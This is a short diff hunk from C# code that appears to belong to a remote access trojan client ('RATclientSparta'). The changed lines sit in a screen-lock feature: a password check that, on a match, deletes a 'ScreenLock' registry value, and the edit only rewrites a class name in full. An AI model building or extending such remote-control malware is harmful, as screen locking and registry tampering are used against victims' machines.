@@ -27,7 +27,7 @@ namespace RATclientSparta.Tools.Screen
         {
             if (this.password != this.button1.Text)
                 return false;
-            RegistryDelete item = new RegistryDelete(); item.DeleteValue("ScreenLock");
+            Setup.RegistryData.RegistryDelete item = new Setup.RegistryData.RegistryDelete(); item.DeleteValue("ScreenLock");
             return true;
         }
 
